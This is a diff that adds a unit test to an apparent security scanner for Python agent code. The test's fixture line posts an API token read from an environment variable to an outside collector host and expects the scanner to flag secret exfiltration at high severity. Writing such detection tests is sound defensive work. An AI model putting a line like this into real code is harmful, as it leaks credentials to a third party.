@@ -13,6 +13,21 @@ test('py: requests.get with literal URL flags external fetch', () => {
   assert.ok(findings.find((f) => f.kind === 'external_fetch_added'));
 });
 
+test('py: external request with env secret flags source secret exfiltration', () => {
+  const findings = detectPyCapability([
+    line(
+      'agent.py',
+      'requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + os.environ["API_TOKEN"]})'
+    )
+  ]);
+
+  assert.ok(findings.find((f) => f.kind === 'external_fetch_added'));
+  const f = findings.find((finding) => finding.kind === 'source_secret_exfil_pattern');
+  assert.ok(f);
+  assert.equal(f.severity, 'high');
+  assert.equal(f.surface, 'source');
+});
+
 test('py: requests.get without literal URL does not over-fire', () => {
   const findings = detectPyCapability([
     line('agent.py', 'resp = requests.get(url, headers=h)')
